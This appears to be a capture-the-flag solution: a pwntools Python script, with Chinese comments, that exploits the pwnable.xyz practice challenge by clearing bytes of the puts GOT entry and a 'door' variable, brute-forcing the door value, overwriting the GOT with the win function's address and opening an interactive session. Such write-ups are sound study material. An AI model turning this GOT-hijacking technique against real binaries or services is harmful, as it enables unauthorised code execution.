逻辑题



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
puts_got = e.got['puts']
win_addr = e.symbols['win']
door_addr = e.symbols['door']
info('puts got:' + hex(puts_got))
info('win address:' + hex(win_addr))
info('door address:' + hex(door_addr))

while True:
    p = remote('svc.pwnable.xyz', 30039)
    # p = process('./challenge')

    # puts got高4字节清零
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Realm: ', str.encode(str(puts_got + 4)))
    p.sendafter(b'> ', b'3')

    # door高3字节清零
    # 现在door在(0~255)范围内
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Realm: ', str.encode(str(door_addr + 1)))
    p.sendafter(b'> ', b'3')

    # 确保door不等于0
    p.sendafter(b'> ', b'2')
    if p.recv() == b'Realm: ':
        p.send(b'1')
        break
    p.close()

# 暴力破解
for i in range(1, 256):
    p.sendafter(b'> ', b'1')
    line = p.recv()
    if line == b'Door: ':
        # 劫持got
        p.send(str.encode(str(win_addr)))
        p.sendafter(b'Realm: ', str.encode(str(puts_got)))
        break
    p.send(b'2')
    p.sendafter(b'Realm: ', str.encode(str(i + 1)))
else:
    error('1')

# gdb.attach(p)
p.sendafter(b'> ', b'0')
p.interactive()

```

